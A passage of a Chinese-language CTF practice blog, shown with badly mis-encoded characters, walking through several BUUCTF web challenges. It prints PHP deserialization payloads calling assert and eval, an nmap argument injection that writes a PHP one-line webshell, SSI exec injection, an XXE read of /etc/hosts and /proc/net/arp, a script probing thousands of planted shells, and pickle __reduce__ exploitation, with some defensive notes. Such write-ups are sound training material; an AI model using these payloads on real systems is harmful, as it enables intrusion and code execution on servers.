æ‰§è¡Œï¼ŒevalæŠŠåˆæ³•çš„phpä»£ç æ‰§è¡Œã€‚</code></pre><p>payloadï¼š?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}</p><p>æˆ–è€…?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:16:&quot;eval($_POST[a]);&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}ç„¶åpostï¼ša=phpinfo</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907151408539.png" alt="image-20210907151408539"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907153837010.png" alt="image-20210907153837010"></p><p>æœç´¢flagå°±èƒ½æ‰¾åˆ°</p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>xffå¤´çš„sstiæ³¨å…¥ï¼Œæˆ‘å¥½åƒä¹‹å‰åšè¿‡ä¸€ä¸ªå·®ä¸å¤šçš„</p><p>ç•Œé¢å³ä¸Šè§’ipå¯éšæ„æ”¹å˜ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨readfileå‡½æ•°è¯»flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907155218173.png" alt="image-20210907155218173"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>æ‰«ç›®å½•ï¼Œå‘ç°index.php.swpç•Œé¢</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907202133630.png" alt="image-20210907202133630"></p><p>è¦è®©passwordå‰å…­ä½md5å€¼ä¸º6d0bc1</p><p>çˆ†ç ´ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907203923885.png" alt="image-20210907203923885"></p><p>ç™»å½•åæŠ“åŒ…</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204116239.png" alt="image-20210907204116239"></p><p>è¿™é‡Œå¯ä»¥çœ‹è§ä¸€ä¸ªshtmlé¡µé¢</p><p>è¿›å…¥åçš„é¡µé¢</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204437473.png" alt="image-20210907204437473"></p><p>è¿™é‡Œadminçš„ä½ç½®æ˜¯æˆ‘ä»¬çš„ç”¨æˆ·åï¼Œè¿™é‡Œåˆ©ç”¨äº†sslæ³¨å…¥</p><p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844"> SSIæ³¨å…¥æ¼æ´_Hydraçš„åšå®¢-CSDNåšå®¢_ssiæ³¨å…¥</a></p><p>ï¼ˆshtmlæ˜¯ä¸€ç§åŸºäºSSIæŠ€æœ¯çš„æ–‡ä»¶ã€‚SSI æ³¨å…¥å…¨ç§°Server-Side Includes Injectionï¼Œå³æœåŠ¡ç«¯åŒ…å«æ³¨å…¥ã€‚SSI æ˜¯ç±»ä¼¼äº CGIï¼Œç”¨äºåŠ¨æ€é¡µé¢çš„æŒ‡ä»¤ã€‚SSI æ³¨å…¥å…è®¸è¿œç¨‹åœ¨ Web åº”ç”¨ä¸­æ³¨å…¥è„šæœ¬æ¥æ‰§è¡Œä»£ç ã€‚SSIæ˜¯åµŒå…¥HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œåœ¨é¡µé¢è¢«æä¾›æ—¶ç”±æœåŠ¡å™¨è¿›è¡Œè¿ç®—ï¼Œä»¥å¯¹ç°æœ‰HTMLé¡µé¢å¢åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œè€Œæ— é¡»é€šè¿‡CGIç¨‹åºæä¾›å…¶æ•´ä¸ªé¡µé¢ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–åŠ¨æ€æŠ€æœ¯ã€‚ä»æŠ€æœ¯è§’åº¦ä¸Šæ¥è¯´ï¼ŒSSIå°±æ˜¯åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šè¡Œè°ƒç”¨çš„å‘½ä»¤æˆ–æŒ‡é’ˆï¼Œå³å…è®¸é€šè¿‡åœ¨HTMLé¡µé¢æ³¨å…¥è„šæœ¬æˆ–è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚IISå’ŒApacheéƒ½å¯ä»¥å¼€å¯SSIåŠŸèƒ½ï¼‰</p><p>ï¼ˆSSIæ³¨å…¥çš„æ¡ä»¶ï¼š</p><p>1.Web æœåŠ¡å™¨å·²æ”¯æŒSSIï¼ˆæœåŠ¡å™¨ç«¯åŒ…å«ï¼‰</p><p>2.Web åº”ç”¨ç¨‹åºæœªå¯¹å¯¹ç›¸å…³SSIå…³é”®å­—åšè¿‡æ»¤</p><p>3.Web åº”ç”¨ç¨‹åºåœ¨è¿”å›å“åº”çš„HTMLé¡µé¢æ—¶ï¼ŒåµŒå…¥ç”¨æˆ·è¾“å…¥ï¼‰</p><p>æ¨¡æ¿å°±ç±»ä¼¼äº</p><p><code>&lt;!--#exec cmd=&quot;æ–‡ä»¶åç§°&quot;--&gt;</code></p><p>å¯ä»¥å…ˆç”¨lsæŸ¥çœ‹ç›®å½•æ‰¾åˆ°flagæ–‡ä»¶ï¼Œå†åˆ©ç”¨catæŸ¥çœ‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204923959.png" alt="image-20210907204923959"></p><p>è®¿é—®é¡µé¢æ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204713176.png" alt="image-20210907204713176"></p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>f12æºç é‡Œæœ‰flag</p><p>å¥½ä¹…æ²¡åšè¿™ä¹ˆç®€å•çš„äº†</p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p>å¸¸è§çš„nmapå‘½ä»¤</p><p><a href="http://linux.51yip.com/search/nmap">nmap linux å‘½ä»¤ åœ¨çº¿ä¸­æ–‡æ‰‹å†Œ (51yip.com)</a></p><p>é€‰é¡¹ è§£é‡Š<br>-oN æ ‡å‡†ä¿å­˜<br>-oX XMLä¿å­˜<br>-oG Grepä¿å­˜<br>-oA ä¿å­˜åˆ°æ‰€æœ‰æ ¼å¼<br>-append-output è¡¥å……ä¿å­˜æ–‡ä»¶<br>é€‰é¡¹-oG<br>å°†ç»“æœGrepä¿å­˜ã€‚</p><p>nmap -F -oG test.txt 192.168.23.1<br>1<br>é€‰é¡¹-oA<br>è¯¥é€‰é¡¹å¯å°†æ‰«æç»“æœä»¥æ ‡å‡†æ ¼å¼ã€XMLæ ¼å¼å’ŒGrepæ ¼å¼ä¸€æ¬¡æ€§ä¿å­˜ï¼Œåˆ†åˆ«æ”¾åœ¨.nmapï¼Œ.xmlå’Œ.gnmapæ–‡ä»¶ä¸­ã€‚</p><p>nmap -F -oA test 192.168.3.2</p><p>è¿™é‡Œå°±æ˜¯è¦ç”¨nmapçš„ -oNå‘½ä»¤å†™shell</p><pre class="language-none"><code class="language-none">&#39; -oN w4ke.txt &#39;</code></pre><p>è¿”å›host maybe downä¹‹åè®¿é—®w4ke.txt</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907215022693.png" alt="image-20210907215022693"></p><p>æ‰€ä»¥å¯ä»¥è¯•è¯•å†™ä¸ªä¸€å¥è¯æœ¨é©¬ä¸Šå»</p><pre class="language-none"><code class="language-none">&#39; -oN b.phtml  &lt;?php eval($_POST[&#39;a&#39;]); ?&gt;&#39;</code></pre><p>è¿”å›äº†hackerï¼Œæ‰€ä»¥åº”è¯¥æ˜¯æœ‰ä¸œè¥¿è¢«è¿‡æ»¤äº†</p><p>è¯•äº†ä¸€ä¸‹å‘ç°æ˜¯phpè¢«è¿‡æ»¤äº†</p><p>å¯ä»¥ç”¨å…¶ä»–çš„è¿›è¡Œæ›¿ä»£</p><pre class="language-none"><code class="language-none">&lt;?&#x3D;eval($_POST[a]);?&gt;</code></pre><p>åˆ©ç”¨postä¼ å‚æ‰§è¡Œå‘½ä»¤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907221126211.png" alt="image-20210907221126211"></p><p>å‚è€ƒé“¾æ¥ </p><p> <a href="https://blog.csdn.net/qq_43801002/article/details/107746582">ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap_æµ©æ­Œå·²è¡Œçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.icode9.com/content-4-756152.html">ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap (icode9.com)</a></p><h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><p>æ ¹æ®é¢˜ç›®æç¤ºä¸‹è½½å‹ç¼©åŒ…æ–‡ä»¶ï¼Œé‡Œé¢å­˜åœ¨ä¸‰åƒå¤šä¸ªphpæ–‡ä»¶</p><p>æ¯ä¸€ä¸ªæ–‡ä»¶é‡Œéƒ½æœ‰shellï¼Œæˆ‘ä»¬è¦æ‰¾åˆ°ä¸€ä¸ªèƒ½ç”¨çš„</p><pre class="language-none"><code class="language-none">import requestsimport osimport reurl &#x3D; &#39;http:&#x2F;&#x2F;22ffcd5e-b2cc-48c3-b7b7-4ba7bcc7d244.node4.buuoj.cn:81&#x2F;&#39;path &#x3D; r&#39;C:\Users\ethe\Desktop\www\src&#39;ptn_get &#x3D; re.compile(br&quot;\$_GET\[&#39;(\w+)&#39;\]&quot;)ptn_res &#x3D; re.compile(br&#39;success_hack&#39;)count &#x3D; 0for f in list(os.scandir(path)):    print(str(f)[11:-2])    count +&#x3D; 1    with open(f.path, &#39;rb&#39;) as fp:        data &#x3D; fp.read()    for get in set(ptn_get.findall(data)):        get &#x3D; get.decode(&#39;utf-8&#39;)        cmd &#x3D; &#39;echo &quot;success_hack&quot;;&#39;        r &#x3D; requests.get(url + f.name, params&#x3D;&#123;get: cmd&#125;)        if ptn_res.search(r.content) is not None:            print(f.name, get)            exit()</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908221800930.png" alt="image-20210908221800930"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908221812146.png" alt="image-20210908221812146"></p><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>é¢˜ç›®æç¤ºxmlï¼ŒæŠ“åŒ…å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909203429736.png" alt="image-20210909203429736"></p><p>çŒœåº”è¯¥æ˜¯æœ‰xxeæ³¨å…¥ï¼Œç›´æ¥ä¸Špayloadï¼Œå‘ç°æ²¡è¯»å–æˆåŠŸ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909203626014.png" alt="image-20210909203626014"></p><p>çœ‹ä¸€çœ‹dologin.phpçš„æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909204007128.png" alt="image-20210909204007128"></p><pre class="language-none"><code class="language-none">&lt;?php&#x2F;*** autor: c0ny1* date: 2018-2-7*&#x2F;$USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;Ã¨Â´Â¦Ã¥ÂÂ·$PASSWORD &#x3D; &#39;024b87931a03f738fff6693ce0a78c88&#39;; &#x2F;&#x2F;Ã¥Â¯Â†Ã§Â Â$result &#x3D; null;libxml_disable_entity_loader(false);$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);try&#123;$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds &#x3D; simplexml_import_dom($dom);$username &#x3D; $creds-&gt;username;$password &#x3D; $creds-&gt;password;if($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD)&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,1,$username);&#125;else&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,0,$username);&#125;&#125;catch(Exception $e)&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;);echo $result;?&gt;</code></pre><p>ä½†æ˜¯ä»è¿™ä¸ªæºç é‡Œä¹Ÿæ‰¾ä¸åˆ°flag</p><p>è¿˜æœ‰ä¸€ä¸ªçŸ¥è¯†xxeå¯ä»¥å†…ç½‘æ¢æµ‹å­˜æ´»çš„ä¸»æœºï¼Œè·å–/etc/hostsæ–‡ä»¶ï¼Œæˆ‘ä»¬åˆ†åˆ«è¯»å–å…³é”®æ–‡ä»¶ï¼š**/etc/hosts å’Œ /proc/net/arp**</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909210613519.png" alt="image-20210909210613519"></p><p>è®¿é—®proc/net/arpæ–‡ä»¶æŸ¥çœ‹æœ‰æ— å¯åˆ©ç”¨å†…ç½‘ä¸»æœº</p><p>å°è¯•è®¿é—®ä¸€ä¸‹è¿™ä¸ªipï¼ŒæŠ¥é”™</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909211003923.png" alt="image-20210909211003923"></p><p>ä¹‹åcæ®µæ‰«æï¼Œæ‰¾åˆ°flag</p><p><strong>æ€»çš„æ¥è¯´ï¼Œä¸»æœºä¸Šé¢æ²¡æœ‰flagï¼Œéœ€è¦å»çœ‹hostsæ–‡ä»¶çœ‹çœ‹å†…ç½‘çš„ä¸»æœºæ˜¯å¦æœ‰flag</strong></p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p>è¿™é¢˜æ„Ÿè§‰æœ‰ç‚¹é—®é¢˜</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153230545.png" alt="image-20210912153230545"></p><p>å†™è„šæœ¬æ‰¾lv6</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153247599.png" alt="image-20210912153247599"></p><p>æ‰¾åˆ°å</p><p>å¾ˆæ˜æ˜¾é’±ä¸å¤Ÿ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153310649.png" alt="image-20210912153310649"></p><p>è¿™é‡Œå¯ä»¥æŠ“åŒ…æ”¹æŠ˜æ‰£ï¼Œå½“æŠ˜æ‰£è¶³å¤Ÿå°çš„æ—¶å€™å°±å‡ºç°ä¸€ä¸ªé‡å®šå‘</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153400419.png" alt="image-20210912153400419"></p><p>æ¥ä¸‹æ¥çš„æ­¥éª¤æ„Ÿè§‰å°±æœ‰ç‚¹é—®é¢˜äº†ï¼Œå½“ç›´æ¥åœ¨burpæ”¹è·¯å¾„çš„æ—¶å€™ä¼šç›´æ¥è·³è¿‡ä¸€ä¸ªcookieçš„ä¿®æ”¹å˜æˆadmin</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153441750.png" alt="image-20210912153441750"></p><p>ä½†æ˜¯ç›´æ¥åœ¨urlæ ä¿®æ”¹ä¼šè¦æ±‚ç”¨æˆ·æ˜¯admin</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153559514.png" alt="image-20210912153559514"></p><p>è¿™å°±è¦æ±‚ä¿®æ”¹jwtçš„cookie</p><p><a href="https://www.cnblogs.com/cjsblog/p/9277677.html">è®¤è¯†JWT - åºŸç‰©å¤§å¸ˆå…„ - åšå®¢å›­ (cnblogs.com)</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153646824.png" alt="image-20210912153646824"></p><p>è¿™é‡Œçš„c-jwt-crackå·¥å…·ä¸ä¼šç”¨ï¼Œæ‰€ä»¥å°±è·³è¿‡è¿™éƒ¨åˆ†å§</p><p>çœ‹ç™»å½•åçš„æºç çœ‹è§<a href="http://www.zipè·¯å¾„/">www.zipè·¯å¾„</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153753980.png" alt="image-20210912153753980"></p><p>ä¸‹è½½å‹ç¼©åŒ…åå‘ç°å…¨ä¸ºpythonæ–‡ä»¶</p><p>è¿™é‡Œæ˜¯åˆ©ç”¨äº†pythonåç¼–è¯‘</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912171400636.png" alt="image-20210912171400636"></p><p>pickleæä¾›äº†ä¸€ä¸ªç®€å•çš„æŒä¹…åŒ–åŠŸèƒ½ã€‚å¯ä»¥å°†å¯¹è±¡ä»¥æ–‡ä»¶çš„å½¢å¼å­˜æ”¾åœ¨ç£ç›˜ä¸Šã€‚</p><p>pickleæ¨¡å—åªèƒ½åœ¨pythonä¸­ä½¿ç”¨ï¼Œpythonä¸­å‡ ä¹æ‰€æœ‰çš„æ•°æ®ç±»å‹ï¼ˆåˆ—è¡¨ï¼Œå­—å…¸ï¼Œé›†åˆï¼Œç±»ç­‰ï¼‰éƒ½å¯ä»¥ç”¨pickleæ¥åºåˆ—åŒ–ï¼Œ<br>pickleåºåˆ—åŒ–åçš„æ•°æ®ï¼Œå¯è¯»æ€§å·®ï¼Œäººä¸€èˆ¬æ— æ³•è¯†åˆ«ã€‚</p><p>p = pickle.loads(urllib.unquote(become))</p><p>urllib.unquote:å°†å­˜å…¥çš„å­—å…¸å‚æ•°ç¼–ç ä¸ºURLæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå³è½¬æ¢æˆä»¥key1 = value1 &amp; key2 = value2çš„å½¢å¼pickle.loads(bytes_object): ä»å­—èŠ‚å¯¹è±¡ä¸­è¯»å–è¢«å°è£…çš„å¯¹è±¡ï¼Œå¹¶è¿”å›æˆ‘çœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢ä¹‹åçš„ç†è§£å°±æ˜¯ï¼Œæˆ‘ä»¬æ„å»ºä¸€ä¸ªç±»ï¼Œç±»é‡Œé¢çš„__reduce__pythoné­”æœ¯æ–¹æ³•ä¼šåœ¨è¯¥ç±»è¢«ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¢«è°ƒç”¨Pickleæ¨¡å—ä¸­æœ€å¸¸ç”¨çš„å‡½æ•°ä¸ºï¼š</p><p>ï¼ˆ1ï¼‰pickle.dump(obj, file, [,protocol])</p><pre class="language-none"><code class="language-none">    å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–å­˜å…¥å·²ç»æ‰“å¼€çš„fileä¸­ã€‚   å‚æ•°è®²è§£ï¼šobjï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚file:æ–‡ä»¶åç§°ã€‚protocolï¼šåºåˆ—åŒ–ä½¿ç”¨çš„åè®®ã€‚å¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚</code></pre><p>ï¼ˆ2ï¼‰pickle.load(file)</p><pre class="language-none"><code class="language-none">    å‡½æ•°çš„åŠŸèƒ½ï¼šå°†fileä¸­çš„å¯¹è±¡åºåˆ—åŒ–è¯»å‡ºã€‚    å‚æ•°è®²è§£ï¼šfileï¼šæ–‡ä»¶åç§°ã€‚</code></pre><p>ï¼ˆ3ï¼‰pickle.dumps(obj[, protocol])</p><pre class="language-none"><code class="language-none">   å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–ä¸ºstringå½¢å¼ï¼Œè€Œä¸æ˜¯å­˜å…¥æ–‡ä»¶ä¸­ã€‚   å‚æ•°è®²è§£ï¼šobjï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚protocalï¼šå¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚</code></pre><p>ï¼ˆ4ï¼‰pickle.loads(string)</p><pre class="language-none"><code class="language-none">   å‡½æ•°çš„åŠŸèƒ½ï¼šä»stringä¸­è¯»å‡ºåºåˆ—åŒ–å‰çš„objå¯¹è±¡ã€‚   å‚æ•°è®²è§£ï¼šstringï¼šæ–‡ä»¶åç§°ã€‚ ã€æ³¨ã€‘ dump() ä¸ load() ç›¸æ¯” dumps() å’Œ loads() è¿˜æœ‰å¦ä¸€ç§èƒ½åŠ›ï¼šdump()å‡½æ•°èƒ½ä¸€ä¸ªæ¥ç€ä¸€ä¸ªåœ°å°†å‡ ä¸ªå¯¹è±¡åºåˆ—åŒ–å­˜å‚¨åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œéšåè°ƒç”¨load()æ¥ä»¥åŒæ ·çš„é¡ºåºååºåˆ—åŒ–è¯»å‡ºè¿™äº›å¯¹è±¡ã€‚è€Œåœ¨__reduce__æ–¹æ³•é‡Œé¢æˆ‘ä»¬å°±è¿›è¡Œè¯»å–flag.txtæ–‡ä»¶ï¼Œå¹¶å°†è¯¥ç±»åºåˆ—åŒ–ä¹‹åè¿›è¡ŒURLç¼–ç </code></pre><p>æ£€æµ‹ååºåˆ—åŒ–æ–¹æ³•ï¼š</p><pre class="language-none"><code class="language-none">å…¨å±€æœç´¢Pythonä»£ç ä¸­æ˜¯å¦å«æœ‰å…³é”®å­—ç±»ä¼¼â€œimport cPickleâ€æˆ–â€œimport pickleâ€ç­‰ï¼Œè‹¥å­˜åœ¨åˆ™è¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦è°ƒç”¨cPickle.loads()æˆ–pickle.loads()ä¸”ååºåˆ—åŒ–çš„å‚æ•°å¯æ§ã€‚</code></pre><p>é˜²å¾¡æ–¹æ³•</p><pre class="language-none"><code class="language-none">1ã€ç”¨æ›´é«˜çº§çš„æ¥å£__getnewargs()ã€__getstate__()ã€__setstate__()ç­‰ä»£æ›¿__reduce__()é­”æœ¯æ–¹æ³•ï¼›2ã€è¿›è¡Œååºåˆ—åŒ–æ“ä½œä¹‹å‰ï¼Œè¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œè‹¥é‡‡ç”¨çš„æ˜¯pickleåº“å¯é‡‡ç”¨è£…é¥°å™¨å®ç°ã€‚</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzM0NTA4Mg==,size_16,color_FFFFFF,t_70.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œé‡‡ç”¨reduce</p><p>å½“__reduce__è¢«å®šä¹‰ä¹‹åï¼Œè¯¥å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨æˆ‘ä»¬è¿™é‡Œçš„evalç”¨äºé‡å»ºå¯¹è±¡çš„æ—¶å€™è°ƒç”¨ï¼Œå³å‘Šè¯‰pythonå¦‚ä½•pickleä»–ä»¬ä¾›evalä½¿ç”¨çš„å³æ‰“å¼€çš„æ–‡ä»¶flag.txtå…¶ä»–çš„å‚æ•°æˆ‘ä»¬å¯ä»¥ä¸å¡«</p><p>ç™¾åº¦ä¸ªè„šæœ¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914214826558.png" alt="image-20210914214826558"></p><p>æŠŠè¿™ä¸ªå€¼ç»™becomeé‡Œæ”¾åŒ…å°±è¡Œ</p><p>å‚è€ƒé“¾æ¥</p><p><a href="https://blog.csdn.net/bluehawksky/article/details/79027055"> Pythoné­”æ³•æ–¹æ³•æŒ‡å—_å®‡å®™æµªå­çš„ä¸“æ -CSDNåšå®¢</a></p><p><a href="https://xz.aliyun.com/t/2289#toc-4">Pythonååºåˆ—åŒ–æ¼æ´çš„èŠ±å¼åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><hr><p>å‡ å¤©ä¹‹åçš„è¡¥ï¼Œjwté‚£ä¸ªå·¥å…·ç¯å¢ƒå¼„å¥½äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914215436728.png" alt="image-20210914215436728"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914215503070.png" alt="image-20210914215503070"></p><h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><p>æ‰å‘ç°è¿™å°±æ˜¯å¯’å‡é‚£ä¸ªæ‹›æ–°èµ›çš„åŸé¢˜</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133220927.png" alt="image-20210916133220927"></p><p>ä¸‹åˆ’çº¿å¯ä»¥ç”¨.æ¥ç»•è¿‡ï¼Œç¬¬äºŒä¸ªifå¯ä»¥åˆ©ç”¨%0aæ¢è¡Œç»•è¿‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133253226.png" alt="image-20210916133253226"></p><p>è¦æ±‚æœ¬åœ°ç™»å½•</p><p>æŠ“åŒ…æ”¹xff</p><p>é‡Œé¢æœ‰ä¸€æ®µjsä»£ç </p><p><img 